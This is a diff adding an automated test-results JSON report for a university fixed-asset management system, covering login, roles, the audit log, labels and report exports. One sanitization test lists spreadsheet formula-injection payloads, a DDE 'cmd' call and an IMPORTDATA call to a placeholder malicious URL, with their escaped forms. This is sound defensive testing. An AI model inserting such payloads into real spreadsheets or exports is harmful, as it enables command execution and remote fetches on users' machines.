@@ -1,0 +1,498 @@
+{
+  "timestamp": "2026-09-28T16:44:13.516Z",
+  "environment": {
+    "coreUrl": "http://localhost:3000",
+    "webUrl": "http://localhost:3001",
+    "nodeVersion": "v22.17.1"
+  },
+  "suites": {
+    "CU01": {
+      "name": "CU01",
+      "cases": [
+        {
+          "testId": "CP-CU01-01",
+          "description": "Login con Código de Funcionario (1001)",
+          "passed": true,
+          "details": {
+            "status": 201
+          },
+          "durationMs": 3204
+        },
+        {
+          "testId": "CP-CU01-02",
+          "description": "Login con Correo Institucional (admin@uagrm.edu.bo)",
+          "passed": true,
+          "details": {
+            "status": 201,
+            "roles": [
+              "ADMINISTRADOR"
+            ]
+          },
+          "durationMs": 1740
+        },
+        {
+          "testId": "CP-CU01-03",
+          "description": "Login con Funcionario Regular (código 3001)",
+          "passed": true,
+          "details": {
+            "status": 201,
+            "roles": [
+              "FUNCIONARIO"
+            ]
+          },
+          "durationMs": 1723
+        },
+        {
+          "testId": "CP-CU01-04",
+          "description": "Rechazo seguro de contraseña inválida (HTTP 401)",
+          "passed": true,
+          "details": {
+            "status": 401,
+            "message": "Credenciales inválidas"
+          },
+          "durationMs": 533
+        },
+        {
+          "testId": "CP-CU01-05",
+          "description": "Inspección de sesión activa y permisos efectivos (/auth/me)",
+          "passed": true,
+          "details": {
+            "id": "11111111-1111-1111-1111-111111111111",
+            "nombre": "Javier Cruz",
+            "permisosCount": 12
+          },
+          "durationMs": 608
+        },
+        {
+          "testId": "CP-CU01-06",
+          "description": "Step-Up Security: Re-verificación de contraseña para operaciones críticas",
+          "passed": true,
+          "details": {
+            "validStatus": 201,
+            "invalidStatus": 401
+          },
+          "durationMs": 463
+        },
+        {
+          "testId": "CP-CU01-07",
+          "description": "Inmunidad a SQL Injection en identificación de usuario",
+          "passed": true,
+          "details": {
+            "testedPayloads": 3
+          },
+          "durationMs": 911
+        }
+      ],
+      "passed": 7,
+      "failed": 0
+    },
+    "CU02": {
+      "name": "CU02",
+      "cases": [
+        {
+          "testId": "CP-CU02-01",
+          "description": "Consulta paginada del catálogo de activos (limit=10)",
+          "passed": true,
+          "details": {
+            "count": 10,
+            "total": 31
+          },
+          "durationMs": 2820
+        },
+        {
+          "testId": "CP-CU02-02",
+          "description": "Filtro por código de activo parcial/exacto (\"UAGRM-2026-00022\")",
+          "passed": true,
+          "details": {
+            "matches": 9
+          },
+          "durationMs": 1041
+        },
+        {
+          "testId": "CP-CU02-03",
+          "description": "Obtención de metadatos de clasificación (/activos/filtros-metadata)",
+          "passed": true,
+          "details": {
+            "estados": 4,
+            "unidades": 8,
+            "grupos": 8
+          },
+          "durationMs": 752
+        },
+        {
+          "testId": "CP-CU02-04",
+          "description": "Consulta de ficha técnica de activo por ID (UAGRM-2026-00022)",
+          "passed": true,
+          "details": {
+            "id": "1958c649-a751-4671-9868-f7eb0fd58ffb",
+            "codigo": "UAGRM-2026-00022",
+            "descripcion": "computador hp34"
+          },
+          "durationMs": 159
+        },
+        {
+          "testId": "CP-CU02-05",
+          "description": "Trazabilidad e historial de eventos (/activos/:id/historial)",
+          "passed": true,
+          "details": {
+            "isArray": true,
+            "response": [
+              {
+                "globalPosition": 100,
+                "streamId": "1958c649-a751-4671-9868-f7eb0fd58ffb",
+                "streamType": "ACTIVO",
+                "version": 1,
+                "eventType": "ActivoRegistrado",
+                "eventSchema": 1,
+                "payload": {
+                  "id": "1958c649-a751-4671-9868-f7eb0fd58ffb",
+                  "nInt": "8986",
+                  "monto": 10000,
+                  "recur": "RECURSOS PROPIOS (RP)",
+                  "codEmp": 3003,
+                  "codigo": "UAGRM-2026-00022",
+                  "estado": "BUENO",
+                  "codOfic": 60,
+                  "tipoIng": "COMPRA DIRECTA",
+                  "fecAdqui": "2026-09-28T00:00:00.000Z",
+                  "nroSerie": "NS-92030K",
+                  "actaRecep": "NA",
+                  "nroActivo": 22,
+                  "ubicacion": "Biblioteca Central Universitaria",
+                  "esVehiculo": false,
+                  "descripcion": "computador hp34",
+                  "grupoContable": "Equipos de Computación y Comunicación"
+                },
+                "metadata": {
+                  "ip": "::1",
+                  "email": "admin@uagrm.edu.bo",
+                  "timestamp": "2026-09-28T16:01:15.663Z",
+                  "usuarioId": "11111111-1111-1111-1111-111111111111"
+                },
+                "prevHash": null,
+                "hash": "2f41711541185cb5367f23ac0f67a82693e0baa6b915a7959c0d36653bc8e690",
+                "recordedAt": "2026-09-28T16:01:15.821Z"
+              }
+            ]
+          },
+          "durationMs": 155
+        },
+        {
+          "testId": "CP-CU02-06",
+          "description": "Rendimiento y latencia en consulta masiva (limit=5000 < 4.0s)",
+          "passed": true,
+          "details": {
+            "latencyMs": 1042,
+            "itemsRetrieved": 22
+          },
+          "durationMs": 1042
+        }
+      ],
+      "passed": 6,
+      "failed": 0
+    },
+    "CU03": {
+      "name": "CU03",
+      "cases": [
+        {
+          "testId": "CP-CU03-01",
+          "description": "Consulta del catálogo de roles del sistema (/roles)",
+          "passed": true,
+          "details": {
+            "rolesCount": 5,
+            "roles": [
+              "ADMINISTRADOR",
+              "FUNCIONARIO",
+              "JEFE_ACTIVO_FIJO",
+              "PRUEBA",
+              "TEST_AUDITOR_1790613379341"
+            ]
+          },
+          "durationMs": 458
+        },
+        {
+          "testId": "CP-CU03-02",
+          "description": "Catálogo de permisos granulares del sistema (/permisos)",
+          "passed": true,
+          "details": {
+            "totalPermisos": 12,
+            "modulos": [
+              "IDENTIDAD_ACCESO",
+              "INSPECCION_CAMPO",
+              "NORMATIVA",
+              "PATRIMONIO"
+            ]
+          },
+          "durationMs": 160
+        },
+        {
+          "testId": "CP-CU03-03",
+          "description": "Creación de nuevo rol dinámico con permisos asignados",
+          "passed": true,
+          "details": {
+            "roleId": "TEST_AUDITOR_1790613869329"
+          },
+          "durationMs": 757
+        },
+        {
+          "testId": "CP-CU03-04",
+          "description": "Actualización de permisos y metadatos de rol dinámico",
+          "passed": true,
+          "details": {
+            "permisos": [
+              "activos:consultar",
+              "bitacora:consultar",
+              "normativa:consultar"
+            ]
+          },
+          "durationMs": 1068
+        },
+        {
+          "testId": "CP-CU03-05",
+          "description": "Eliminación segura del rol dinámico de prueba (cleanup)",
+          "passed": true,
+          "details": {
+            "status": 200
+          },
+          "durationMs": 761
+        },
+        {
+          "testId": "CP-CU03-06",
+          "description": "Protección de integridad: Bloqueo de eliminación del rol ADMINISTRADOR",
+          "passed": true,
+          "details": {
+            "status": 403
+          },
+          "durationMs": 4
+        },
+        {
+          "testId": "CP-CU03-07",
+          "description": "Seguridad RBAC: Funcionario no administrador recibe 403 Forbidden",
+          "passed": true,
+          "details": {
+            "status": 403
+          },
+          "durationMs": 4
+        }
+      ],
+      "passed": 7,
+      "failed": 0
+    },
+    "CU04": {
+      "name": "CU04",
+      "cases": [
+        {
+          "testId": "CP-CU04-01",
+          "description": "Consulta estructurada de bitácora forense (/auditoria)",
+          "passed": true,
+          "details": {
+            "totalEvents": 202,
+            "retrieved": 20
+          },
+          "durationMs": 1517
+        },
+        {
+          "testId": "CP-CU04-02",
+          "description": "Filtro multicriterio forense (accion=LOGIN, resultado=EXITOSO)",
+          "passed": true,
+          "details": {
+            "matchingEvents": 5
+          },
+          "durationMs": 446
+        },
+        {
+          "testId": "CP-CU04-03",
+          "description": "Preservación de campos forenses indispensables (IP, fecha, acción)",
+          "passed": true,
+          "details": {
+            "item": {
+              "id": "207",
+              "usuarioId": null,
+              "emailUsuario": "admin@uagrm.edu.bo",
+              "accion": "ELIMINAR_ROL",
+              "modulo": "IDENTIDAD_ACCESO",
+              "entidadId": "TEST_AUDITOR_1790613869329",
+              "resultado": "EXITOSO",
+              "ipOrigen": "::1",
+              "userAgent": "node",
+              "motivoRechazo": "Rol personalizado TEST_AUDITOR_1790613869329 eliminado del sistema",
+              "payloadHash": null,
+              "creadoEn": "2026-09-28T16:44:31.764Z"
+            }
+          },
+          "durationMs": 167
+        },
+        {
+          "testId": "CP-CU04-04",
+          "description": "Restricción de acceso forense: Funcionario bloqueado con HTTP 403",
+          "passed": true,
+          "details": {
+            "status": 403
+          },
+          "durationMs": 3
+        },
+        {
+          "testId": "CP-CU04-05",
+          "description": "Inmutabilidad de la bitácora: Endpoints POST/DELETE deshabilitados",
+          "passed": true,
+          "details": {
+            "postStatus": 404,
+            "deleteStatus": 404
+          },
+          "durationMs": 5
+        }
+      ],
+      "passed": 5,
+      "failed": 0
+    },
+    "CU05": {
+      "name": "CU05",
+      "cases": [
+        {
+          "testId": "CP-CU05-01",
+          "description": "Consulta del catálogo de formatos de etiquetas (/etiquetas/plantillas)",
+          "passed": true,
+          "details": {
+            "totalPlantillas": 6
+          },
+          "durationMs": 265
+        },
+        {
+          "testId": "CP-CU05-02",
+          "description": "Creación y registro de plantilla de etiqueta configurable",
+          "passed": true,
+          "details": {
+            "plantillaId": "060f7217-8893-4071-9cb3-431510c5946a"
+          },
+          "durationMs": 307
+        },
+        {
+          "testId": "CP-CU05-03",
+          "description": "Eliminación controlada de plantilla de prueba",
+          "passed": true,
+          "details": {
+            "status": 200
+          },
+          "durationMs": 302
+        },
+        {
+          "testId": "CP-CU05-04",
+          "description": "Emisión de lote de identificadores con payload cifrado QR/Barras",
+          "passed": true,
+          "details": {
+            "generados": 1,
+            "total": 1
+          },
+          "durationMs": 1053
+        },
+        {
+          "testId": "CP-CU05-05",
+          "description": "Reposición de etiqueta con re-autenticación Step-Up (UAGRM-2026-00022)",
+          "passed": true,
+          "details": {
+            "success": true,
+            "data": "791102F290"
+          },
+          "durationMs": 1202
+        },
+        {
+          "testId": "CP-CU05-06",
+          "description": "Auditoría e historial de reposiciones por activo (/etiquetas/historial/:cod)",
+          "passed": true,
+          "details": {
+            "totalEmisiones": 6,
+            "historialCount": 6
+          },
+          "durationMs": 153
+        }
+      ],
+      "passed": 6,
+      "failed": 0
+    },
+    "CU06": {
+      "name": "CU06",
+      "cases": [
+        {
+          "testId": "CP-CU06-01",
+          "description": "Extracción masiva de activos para reporte parametrizado (limit=5000)",
+          "passed": true,
+          "details": {
+            "totalExtraidos": 22,
+            "totalDB": 31
+          },
+          "durationMs": 1034
+        },
+        {
+          "testId": "CP-CU06-02",
+          "description": "Extracción masiva de bitácora para reporte parametrizado (limit=5000)",
+          "passed": true,
+          "details": {
+            "totalExtraidos": 203,
+            "totalDB": 203
+          },
+          "durationMs": 434
+        },
+        {
+          "testId": "CP-CU06-03",
+          "description": "Compatibilidad de tipado para Excel (.xlsx OpenXML nativo)",
+          "passed": true,
+          "details": {
+            "sampleKeys": [
+              "id",
+              "codigo",
+              "descripcion",
+              "grupoContable",
+              "ubicacion",
+              "estado",
+              "valor",
+              "fechaAlta"
+            ]
+          },
+          "durationMs": 0
+        },
+        {
+          "testId": "CP-CU06-04",
+          "description": "Sanitización estricta contra CSV/Formula Injection (=,+,-,@)",
+          "passed": true,
+          "details": {
+            "original": [
+              "=SUM(A1:A10)",
+              "+cmd|/c calc",
+              "-2+3*4",
+              "@IMPORTDATA(\"http://malicious\")"
+            ],
+            "sanitized": [
+              "'=SUM(A1:A10)",
+              "'+cmd|/c calc",
+              "'-2+3*4",
+              "'@IMPORTDATA(\"http://malicious\")"
+            ]
+          },
+          "durationMs": 0
+        },
+        {
+          "testId": "CP-CU06-05",
+          "description": "Parámetros institucionales oficiales de reporte PDF (UAGRM / Santa Cruz)",
+          "passed": true,
+          "details": {
+            "params": {
+              "titulo": "REPORTE OFICIAL DE ASIGNACIONES",
+              "subtitulo": "DEPARTAMENTO DE ACTIVO FIJO",
+              "gestion": "Gestión 2026",
+              "lugar": "Santa Cruz de la Sierra"
+            }
+          },
+          "durationMs": 0
+        }
+      ],
+      "passed": 5,
+      "failed": 0
+    }
+  },
+  "summary": {
+    "total": 36,
+    "passed": 36,
+    "failed": 0,
+    "durationMs": 25304
+  }
+}
